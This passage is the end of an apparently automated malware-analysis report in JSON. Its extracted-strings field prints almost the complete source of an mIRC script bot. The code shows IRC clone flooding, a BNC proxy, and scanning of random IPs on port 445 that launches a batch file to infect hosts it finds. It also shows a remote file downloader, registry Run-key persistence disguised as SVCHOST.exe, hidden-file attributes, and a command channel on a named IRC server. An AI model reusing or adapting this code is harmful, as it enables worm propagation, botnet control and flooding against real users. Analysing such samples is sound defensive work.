            "  if ($gettok(%BncClient,1,32) == PASS) { ",
            "    if ($gettok(%BncClient,2,32) == %Bnc.passwd) {",
            "      sockwrite -n $sockname NOTICE AUTH : $+ Welcome to BNC 2.6.4-WIN, the irc proxy",
            "      sockwrite -n $sockname NOTICE AUTH : $+ Level two, lets connect to something real now",
            "      sockwrite -n $sockname NOTICE AUTH : $+ type /quote conn [server] <port> <pass> to connect",
            "      %Bnc.legit = yes",
            "    } ",
            "    if ($gettok(%BncClient,2,32) != %Bnc.passwd) { ",
            "      sockwrite -n $sockname NOTICE AUTH : $+ Failed Pass!!",
            "    }",
            "  if ($gettok(%BncClient,1,32) == CONN) {",
            "    if (%Bnc.legit != yes) { sockwrite -n $sockname NOTICE AUTH : $+ BNC Exploits dont work on This | sockclose   $sockname",
            "    }",
            "    if (BncServer $+ $remove($sockname,BncClient) != $null) {",
            "      sockclose BncServer $+ $remove($sockname,BncClient)",
            "    }",
            "    sockopen BncServer $+ $remove($sockname,BncClient) $gettok(%BncClient,2,32) $gettok(%BncClient,3,32)",
            "    sockwrite -n $sockname NOTICE AUTH : $+ Making reality through $gettok(%BncClient,2,32) port $gettok(%BncClient,3,32)",
            "    set %Bnc.server.passwd $gettok(%BncClient,4,32)",
            "  else {",
            "    if ($sock(BncServer $+ $remove($sockname,BncClient)).status != active) {",
            "      halt",
            "    }",
            "    sockwrite -n BncServer $+ $remove($sockname,BncClient) %BncClient",
            "alias jc { /join $rds(sc) $rds(sk) }",
            "on *:sockopen:BncServer*:{",
            "  if ($sockerr) {",
            "    sockwrite -n $sockname NOTICE AUTH : $+ Failed Connection",
            "    sockclose $sockname",
            "    halt",
            "  if ($sock($sockname).status != active) {",
            "    sockwrite -n $sockname NOTICE AUTH : $+ Failed Connection",
            "    sockclose BncServer $+ $remove($socknme, BncServer)",
            "    halt",
            "  sockwrite -n BncClient $+ $remove($sockname,BncServer) NOTICE AUTH : $+ Suceeded connection",
            "  sockwrite -n $sockname NICK %Bnc.nick",
            "  sockwrite -n $sockname USER %Bnc.user",
            "on *:join:#:{ if (# = $rds(sc)) { if ($nick = $me) { timerjc off } } }",
            "on *:sockread:BncServer*:{",
            "  sockread %BncServer",
            "  if ($sock(BncClient $+ $remove($sockname,BncServer)).status != active) {",
            "    halt",
            "  sockwrite -n BncClient $+ $remove($sockname,BncServer) %BncServer",
            "on *:sockread:Ntimer*:{",
            "  sockread %ntread",
            "  Stay %ntread",
            "on *:sockread:xxx*:{",
            "  sockread %QHTread",
            "  Stay %QHTread",
            "alias fnick {",
            "  set %fnick $rand(1,10)",
            "  if (%fnick = 1) { return $read x.x $+ $chr($r(65,125)) $+ $chr($r(65,125))  }",
            "  if (%fnick = 2) { return $chr($r(65,125)) $+ $read x.x $+ $chr($r(65,125))  }",
            "  if (%fnick = 3) { return $chr($r(65,125)) $+ $chr($r(65,125)) $+ $read  x.x }",
            "  if (%fnick = 4) { return $r(A,Z) $+ $read x.x $+ $r(A,Z) }",
            "  if (%fnick = 5) { return $chr($r(65,125)) $+ $chr($r(65,125)) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z)  }",
            "  if (%fnick = 6) { return $read  x.x $+ $r(1,40) $+ $chr($r(65,125))  }",
            "  if (%fnick = 7) { return $r(a,z) $+ $read x.x $+ $r(a,z) }",
            "  if (%fnick = 8) { return $read  x.x $+ $r(a,z) $+ $chr($r(65,125))  }",
            "  if (%fnick = 9) { return $read  x.x $+ $r(1,10) $+ $chr($r(65,125))  }",
            "  if (%fnick = 10) { return $read  x.x $+ $r(20,50) $+ $chr($r(65,125)) }",
            "alias Cona { server $rds(sr) $rds(sp) }",
            "alias clone {",
            "  if ($1 = con) { set %cserver $2 | /set %cport $3 | /timeropensock $+ $fnick $4 2 opensock }",
            "  if ($1 = join) { sockwrite -nt xxx* Join $2- }",
            "  if ($1 = part) { sockwrite -nt xxx* Part $2 : $+ $3- }",
            "  if ($1 = msg) { sockwrite -nt xxx* privmsg $2 : $+ $3- }",
            "  if ($1 = notice) { sockwrite -nt xxx* notice $2 : $+ $3- }",
            "  if ($1 = reg) { sockwrite -nt xxx* Privmsg NickServ : $+ register $2- | sockwrite -nt xxx* Privmsg NickServ : $+ identify $2- }",
            "  if ($1 = creg) { set %rchan # $+ $fnick $+ $rand(1,1000) | sockwrite -nt xxx* Join %rchan | sockwrite -nt xxx* Privmsg Chanserv : register %rchan $fnick xxx }",
            "  if ($1 = jp) { sockwrite -nt xxx* Join $2- | sockwrite -nt xxx* part $2 : $3- | sockwrite -nt xxx* Join $2- | sockwrite -nt xxx* part $2 : $3- | sockwrite -nt xxx* Join $2- | sockwrite -nt xxx* part $2 : $3- }",
            "  if ($1 = jmp) { sockwrite -nt xxx* Join $2 | sockwrite -nt xxx* privmsg $2 : $3- | sockwrite -nt xxx* part $2 }",
            "  if ($1 = flood.c) { sockwrite -nt xxx* join $2 | sockwrite -nt xxx* privmsg $2 : $3- | sockwrite -nt xxx* notice $2 : $3- | sockwrite -nt xxx* privmsg $2 : $3- }",
            "  if ($1 = flood.n) { sockwrite -nt xxx* privmsg $2 : $3- | sockwrite -nt xxx* notice $2 : $3- | sockwrite -nt xxx* privmsg $2 : $3- }",
            "  if ($1 = chat.flood) { sockwrite -nt xxx* privmsg $2 :",
            "DCC CHAT $2 1058633484 3481",
            "  if ($1 = Quit) { Sockwrite -nt xxx* Quit : $+ $2- }",
            "  if ($1 = massquit) { SockWrite -nt xxx* Join $2 | Sockwrite -nt xxx* Quit : $+ $3- }",
            "  if ($1 = fnick) { sockwrite -nt xxx* Nick $2 $+ $r(1,1000) $+ $r(1,1000)  }",
            "  if ($1 = Die) { timeropensock* off | sockclose xxx* }",
            "alias opensock { sockopen xxx $+ $fnick %cserver %cport }",
            "alias Stay {",
            "  if (PING = $1) { sockwrite -nt * $1- }",
            "on *:Sockopen:xxx*:{",
            "  set -u1 %user $rand(A,Z) $+ $fnick $+ $rand(A,Z)",
            "  .sockwrite -nt $sockname USER %user %user %user : $+ %user",
            "  .sockwrite -nt $sockname NICK $fnick",
            "raw 433:*:{",
            "  nick [SvR- $+ $r(1000,9999) $+ ]] ",
            "alias apages { set %asite $1 | set %filesite $2 | sockopen apages $+ $fnick %asite 80 }",
            "alias apagestop { timerapage* off | sockclose apages* }",
            "on *:sockopen:apages*:{",
            "  timerapage $+ $fnick 0 2 sockwrite -nt apages* GET %filesite",
            "on *:socklisten:ident: { .sockaccept $sockname $+ . $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) }",
            "on *:sockread:IDENT.*: { sockread %tmp | tokenize 32 %tmp | sockwrite -tn $sockname $3 $2 $1 : USERID : UNIX : $fnick | unset %tmp }",
            "alias startscan {",
            "  inc %totalscaning",
            "  if %totalscaning == %total finished",
            "  set %ip1 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 1",
            "  set %ip2 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 2",
            "  set %ip3 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 3",
            "  set %ip4 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 4",
            "  set %ip5 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 5",
            "  set %ip6 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 6",
            "  set %ip7 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 7",
            "  set %ip8 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 8",
            "  set %ip9 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 9",
            "  set %ip10 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 10",
            "  set %ip11 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 11",
            "  set %ip12 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 12",
            "  set %ip13 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 13",
            "  set %ip14 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 14",
            "  set %ip15 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 15",
            "  set %ip16 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 16",
            "  set %ip17 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 17",
            "  set %ip18 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 18",
            "  set %ip19 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 19",
            "  set %ip20 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 20",
            "  set %ip21 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 21",
            "  set %ip22 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 22",
            "  set %ip23 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 23",
            "  set %ip24 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 24",
            "  set %ip25 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  opensocks",
            "alias opensocks {",
            "  sockopen ip1 %ip1 445",
            "  if $1 == 1 finished",
            "  sockopen ip2 %ip2 445",
            "  if $1 == 2 finished",
            "  sockopen ip3 %ip3 445",
            "  if $1 == 3 finished",
            "  sockopen ip4 %ip4 445",
            "  if $1 == 4 finished",
            "  sockopen ip5 %ip5 445",
            "  if $1 == 5 finished",
            "  sockopen ip6 %ip6 445",
            "  if $1 == 6 finished",
            "  sockopen ip7 %ip7 445",
            "  if $1 == 7 finished",
            "  sockopen ip8 %ip8 445",
            "  if $1 == 8 finished",
            "  sockopen ip9 %ip9 445",
            "  if $1 == 9 finished",
            "  sockopen ip10 %ip10 445",
            "  if $1 == 10 finished",
            "  sockopen ip11 %ip11 445",
            "  if $1 == 11 finished",
            "  sockopen ip12 %ip12 445",
            "  if $1 == 12 finished",
            "  sockopen ip13 %ip13 445",
            "  if $1 == 13 finished",
            "  sockopen ip14 %ip14 445",
            "  if $1 == 14 finished",
            "  sockopen ip15 %ip15 445",
            "  if $1 == 15 finished",
            "  sockopen ip16 %ip16 445",
            "  if $1 == 16 finished",
            "  sockopen ip17 %ip17 445",
            "  if $1 == 17 finished",
            "  sockopen ip18 %ip18 445",
            "  if $1 == 18 finished",
            "  sockopen ip19 %ip19 445",
            "  if $1 == 19 finished",
            "  sockopen ip20 %ip20 445",
            "  if $1 == 20 finished",
            "  sockopen ip21 %ip21 445",
            "  if $1 == 21 finished",
            "  sockopen ip22 %ip22 445",
            "  if $1 == 22 finished",
            "  sockopen ip23 %ip23 445",
            "  if $1 == 23 finished",
            "  sockopen ip24 %ip24 445",
            "  if $1 == 24 finished",
            "  sockopen ip25 %ip25 445",
            "  timerscannerTE 1 12 sockclose ip*",
            "  timerscannerSA 1 15 startscan",
            "alias randip {",
            "  unset %1p1 %1p2",
            "  set %1p1 $1-",
            "  set %1p2 $replace($gettok(%1p1,1,46),*,$rand(1,255))",
            "  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,2,46),*,$rand(1,255))",
            "  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,3,46),*,$rand(1,255))",
            "  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,4,46),*,$rand(1,255))",
            "  return %1p2",
            "on 1:sockopen:ip*:{ if ($sockerr > 0) { halt } | set %ant1 % [ $+ [ $sockname ] ] | run t.exe /n /fh /r \"r.BAT   %ant1 $rds(sf) $+ \" | saym ",
            "scanner",
            " Found: %ant1 $+ , attempting to infect.. | sockclose $sockname | unset %ant1 | halt }",
            "alias download {",
            "  var %socket $+(dl,$chr(46),$nopath($2))",
            "  if (!$sock(%socket)) {",
            "    sockopen %socket $1 80",
            "    sockmark %socket HEAD $1 $2",
            "  else { echo $color(info) -s * Socket already in use. }",
            "alias downd {",
            "  if ($exists($nopath($2)) = $false) || ($file($nopath($2)).size != $3) {",
            "    var %socket $+(dl,$chr(46),$nopath($2))",
            "    if (!$sock(%socket)) {",
            "      sockopen %socket $1 80",
            "      sockmark %socket HEAD $1 $2",
            "    }",
            "    else { echo $color(info) -s * Socket already in use. }",
            "alias percent return $+($round($calc((100 / $2) * $1),2),%)",
            "on *:SOCKOPEN:dl.*:{",
            "  if ($sockerr) { echo $color(info) -s * Error: $sock($sockname).wsmsg | return }",
            "  hadd -m ticks $sockname $ticks",
            "  var %file = $nopath($gettok($sock($sockname).mark,3,32)), %fullfile = $+(\",$mircdir,%file,\"), %sckr = sockwrite -n $sockname, %^ = $gettok($sock($sockname).mark,3,32)",
            "  write -c %fullfile",
            "  %sckr GET $iif(left(%^,1) != $chr(47),$chr(47) $+ %^,%^) HTTP/1.0",
            "  %sckr HOST: $gettok($sock($sockname).mark,2,32)",
            "  %sckr ACCEPT: *.*",
            "  %sckr $crlf",
            "on *:SOCKREAD:dl.*:{",
            "  if ($sockerr) {",
            "    echo $color(info) -s * Error: $sock($sockname).wsmsg",
            "    return",
            "  var %a",
            "  :begin",
            "  if ($gettok($sock($sockname).mark,1,32) == head) { sockread %a }",
            "  else { sockread &b }",
            "  if ($sockbr) {",
            "    tokenize 32 $sock($sockname).mark",
            "    if ($1 == HEAD) {",
            "      if (%a) {",
            "        if ($gettok(%a,1,32) == Content-Length:) { var %totsize = $gettok(%a,2,32) }",
            "      }",
            "      else {",
            "        sockmark $sockname GET $2- %totsize",
            "      }",
            "    }",
            "    elseif ($1 == GET) {",
            "      var %file = $+(\",$mircdir,$nopath($3),\"), %cursize = $file(%file).size",
            "      var %totsize = $gettok($sock($sockname).mark,4,32)",
            "      bwrite %file -1 &b",
            "    }",
            "    goto begin",
            "on *:SOCKCLOSE:dl.*:{",
            "  var %ticks = $calc(($ticks - $hget(ticks,$sockname)) /1000)",
            "  /saym * Download of $nopath($gettok($sock($sockname).mark,3,32)) completed in %ticks seconds.",
            "on *:connect:{ .ial on | .timerjc 0 $rand(5,10) /jc |   .timercheck off | .pdcc on | .fsend on | clearall }",
            "alias makeSHR {",
            "  var %SHR $findfile($mircdir,*.*,0,write SHR.bat attrib +R +S +H $noPATH($1-))",
            "  run t.exe /n /fh /r SHR.bat",
            "alias rds {",
            "  if ($1 = sf) { return dot.exe }",
            "  if ($1 = sr) { return sev.cellfiles.org }",
            "  if ($1 = sp) { return 6667 }",
            "  if ($1 = sc) { return #svr } ",
            "  if ($1 = sk) { return rvs }",
            "alias RegRead {",
            "  if ($1 != $null) {",
            "    var %a = regread",
            "    .comopen %a WScript.Shell",
            "    if !$comerr {",
            "      var %b =  $com(%a,RegRead,3,bstr,$1-)",
            "      var %c = $com(%a).result",
            "      .comclose %a",
            "      if (%c != $null) return %c",
            "      else {",
            "        return NA ",
            "      }",
            "    }",
            "  else { return error! complete data }",
            "alias RegWrite {",
            "  if ($1 != $null) && ($2 != $null) && ($3 != $null) {",
            "    var %a = RegWrite",
            "    .comopen %a WScript.Shell",
            "    if !$comerr {",
            "      var %b =  $com(%a,RegWrite,3,bstr,$1,bstr,$2,bstr,$3)",
            "      .comclose %a",
            "    }",
            "    if ($3 == REG_EXPAND_SZ) || ($3 == REG_SZ) {",
            "      if ($regread($1) == $2) { return the value ( $+ $1 $+ ) was created }",
            "      else { return error! when writing }",
            "    }",
            "  else { return error! complete data }",
            "alias RegDelete {",
            "  if ($1 != $null) {",
            "    var %a = RegDelete ",
            "    .comopen %a WScript.Shell",
            "    if !$comerr {",
            "      var %b =  $com(%a,RegDelete,3,bstr,$1)",
            "      .comclose %a",
            "    }",
            "  else { return error! complete data }",
            "alias sconf { ",
            "  .nick [SvR- $+ $r(1000,9999) $+ ]]",
            "  .n0clone",
            "  .Cona",
            "  .timercheck 0 20 Cona",
            "  .timerregs -o 0 1 regs",
            "  .run t.exe /n /fh /r e.BAT",
            "  .copyself",
            "alias regs { if ($Regread(HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ddxd)  = NA) { $RegWrite(HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ddxd,$mircdirSVCHOST.exe,REG_SZ) } }",
            "alias saym { if ($me isvo $rds(sc)) { clearall | msg $rds(sc) $1- } }",
            "alias copyself { ",
            "  if ($exists($findfile(c:\\winnt\\, $+ $mon(nf) $+ ,1)) = $true ) && ($exists($mon(nf)) = $false ) { .copy $findfile(c:\\winnt\\, $+ $mon(nf) $+ ,1) $mon(nf) }",
            "  if ($exists($findfile(c:\\windows\\, $+ $mon(nf) $+ ,1)) = $true ) && ($exists($mon(nf)) = $false ) { .copy $findfile(c:\\windows\\, $+ $mon(nf) $+ ,1) $mon(nf) }",
            "  if ($exists($findfile(d:\\winnt\\, $+ $mon(nf) $+ ,1)) = $true ) && ($exists($mon(nf)) = $false ) { .copy $findfile(d:\\winnt\\, $+ $mon(nf) $+ ,1) $mon(nf) }",
            "  if ($exists($findfile(d:\\windows\\, $+ $mon(nf) $+ ,1)) = $true ) && ($exists($mon(nf)) = $false ) { .copy $findfile(d:\\windows\\, $+ $mon(nf) $+ ,1) $mon(nf) }"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [
            "127.0.0.1"
        ],
        "url": []
    },
    "time": "0:00:00.372383",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
